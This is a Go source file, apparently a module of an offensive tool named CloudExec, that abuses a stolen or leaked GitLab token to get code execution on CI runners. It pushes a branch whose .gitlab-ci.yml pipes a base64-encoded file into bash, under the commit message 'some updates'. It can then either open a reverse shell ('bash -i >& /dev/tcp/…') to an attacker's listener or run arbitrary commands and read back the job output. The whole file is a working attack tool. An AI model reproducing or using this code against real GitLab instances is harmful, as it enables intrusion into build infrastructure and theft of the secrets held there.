package modules

import (
	"crypto/md5"
	b64 "encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	utils "github.com/cotsom/CloudExec/internal/utils"
	"github.com/go-git/go-billy/v6"
	"github.com/go-git/go-billy/v6/memfs"
	"github.com/go-git/go-git/v6"
	"github.com/go-git/go-git/v6/config"
	"github.com/go-git/go-git/v6/plumbing"
	"github.com/go-git/go-git/v6/storage/memory"
)

type RunnerRce struct{}
type Job struct {
	Id int `json:"id"`
}

func (m RunnerRce) RunModule(target string, flags map[string]string, scheme string) {
	var err error
	var payload string
	var pjid int
	var project Project
	var access int

	port := "80"
	if flags["port"] != "" {
		port = flags["port"]
	}

	if flags["timeout"] == "" {
		flags["timeout"] = "10"
	}

	if flags["tag"] == "" {
		payload = `
stages:
  - test

test-job:       # This job runs in the test stage, which runs first.
  stage: test
  script:
    - base64 -d -i upd | setsid bash`
	} else {
		payload = fmt.Sprintf(`
stages:
  - test

test-job:       # This job runs in the test stage, which runs first.
  stage: test
  tags:
    - %s
  script:
    - base64 -d -i upd | setsid bash`, flags["tag"])
	}

	if flags["pjid"] == "" {
		utils.Colorize(utils.ColorRed, "Empty project id value")
		return
	} else {
		if pjid, err = strconv.Atoi(flags["pjid"]); err != nil {
			utils.Colorize(utils.ColorRed, "Invalid project id value")
			return
		}
	}
	timeout, _ := strconv.Atoi(flags["timeout"])
	// client := http.Client{
	// 	Timeout: time.Duration(timeout) * time.Second,
	// }

	//get repo
	body, err := getProjectById(target, flags, scheme, port, pjid)
	if err != nil {
		fmt.Println("Error getting project by id:", err)
	}
	//check access
	err = json.Unmarshal(body, &project)
	if err != nil {
		fmt.Println("Error unmarshalling JSON:", err)
	}
	if project.Permissions.GroupAccess != nil {
		access = project.Permissions.GroupAccess.AccessLevel
	}
	if project.Permissions.ProjectAccess != nil && access == 0 {
		access = project.Permissions.ProjectAccess.AccessLevel
	}
	if access < 30 {
		utils.Colorize(utils.ColorRed, fmt.Sprintf("\033[1A\r\033[2K[-] %s:%s - Gitlab | Token %s has %d access lvl for project %s\n", target, port, flags["token"], access, project.Name))
		return
	} else {
		utils.Colorize(utils.ColorGreen, fmt.Sprintf("\033[1A\r\033[2K[+] %s:%s - Gitlab | Token %s has %d access lvl for project %s\n", target, port, flags["token"], access, project.Name))
	}

	//clone
	wt := memfs.New()
	storer := memory.NewStorage()

	rep, err := git.Clone(storer, wt, &git.CloneOptions{
		URL:             fmt.Sprintf("%s://token:%s@%s:%s/%s", scheme, flags["token"], target, port, project.PathWithNamespace),
		Progress:        nil,
		InsecureSkipTLS: true,
	})
	if err != nil {
		utils.Colorize(utils.ColorRed, err.Error())
		return
	}
	//checkout
	worktree, _ := rep.Worktree()
	branchRawName := md5.Sum([]byte(project.PathWithNamespace))
	branchName := hex.EncodeToString(branchRawName[:])
	worktree.Checkout(&git.CheckoutOptions{
		Branch: plumbing.NewBranchReferenceName(branchName),
		Create: true,
	})

	//reverse shell
	if flags["revshell"] != "" {
		listener := strings.Split(flags["revshell"], ":")
		if len(listener) != 2 {
			utils.Colorize(utils.ColorRed, "Invalid revshell params, need IP:PORT")
			return
		}
		revshellPayload := b64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", listener[0], listener[1])))
		err = pushPayload(wt, revshellPayload, payload, worktree, rep, branchName)
		if err != nil {
			utils.Colorize(utils.ColorRed, err.Error())
			return
		}
		utils.Colorize(utils.ColorYellow, fmt.Sprintf("\033[1A\r\033[2K[+] %s:%s - Gitlab | Started reverse shell \n", target, port))
		return
	}
	// exec commands
	if flags["exec"] != "" {
		execPayload := b64.StdEncoding.EncodeToString([]byte(flags["exec"]))
		err = pushPayload(wt, execPayload, payload, worktree, rep, branchName)
		if err != nil {
			utils.Colorize(utils.ColorRed, err.Error())
			return
		}

		if timeout < 2 {
			time.Sleep(2 * time.Second)
		} else {
			time.Sleep(time.Duration(timeout) * time.Second)
		}
		jobs, err := getJobsByRef(target, flags, scheme, port, project.Id, branchName)
		if err != nil {
			utils.Colorize(utils.ColorRed, err.Error())
			return
		}
		outputRaw, err := getTraceByJob(target, flags, scheme, port, project.Id, getMaxJobId(jobs))
		if err != nil {
			utils.Colorize(utils.ColorRed, err.Error())
		}
		output := strings.Split(string(outputRaw), "stage of the job script")

		utils.Colorize(utils.ColorYellow, fmt.Sprintf("\033[1A\r\033[2K[+] %s:%s - Gitlab | Command executed \n%s", target, port, output[1]))
		return

	}

}

func pushPayload(wt billy.Filesystem, b64payload string, pipeline string, worktree *git.Worktree, rep *git.Repository, branchName string) error {
	ciyamlHandler, err := wt.OpenFile(".gitlab-ci.yml", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0666)
	if err != nil {
		return err
	}
	rshellHandler, err := wt.Create("upd")
	if err != nil {
		return err
	}
	rshellHandler.Write([]byte(b64payload))
	ciyamlHandler.Write([]byte(pipeline))
	worktree.Add(".")
	worktree.Commit("some updates", &git.CommitOptions{})
	err = rep.Push(&git.PushOptions{
		Progress:        nil,
		InsecureSkipTLS: true,
		RefSpecs: []config.RefSpec{
			config.RefSpec(fmt.Sprintf(
				"+refs/heads/%[1]s:refs/heads/%[1]s", branchName)),
		},
	})
	if err != nil {
		return err
	}
	return nil

}

func getJobsByRef(target string, flags map[string]string, scheme, port string, projectId int, ref string) ([]Job, error) {
	var jobs []Job
	url := fmt.Sprintf("%s://%s:%s/api/v4/projects/%d/jobs?ref=%s", scheme, target, port, projectId, ref)
	body, err := makeRequest(url, flags["token"], utils.GetTimeout(flags))
	if err != nil {
		return []Job{}, err
	}
	err = json.Unmarshal(body, &jobs)
	if err != nil {
		return []Job{}, err
	}
	return jobs, nil
}

func getMaxJobId(jobs []Job) int {
	if len(jobs) == 0 {
		return 0
	}
	sort.Slice(jobs, func(i, j int) bool {
		return jobs[i].Id < jobs[j].Id
	})
	return jobs[len(jobs)-1].Id
}

func getTraceByJob(target string, flags map[string]string, scheme, port string, projectId int, job int) ([]byte, error) {
	url := fmt.Sprintf("%s://%s:%s/api/v4/projects/%d/jobs/%d/trace", scheme, target, port, projectId, job)
	return makeRequest(url, flags["token"], utils.GetTimeout(flags))
}
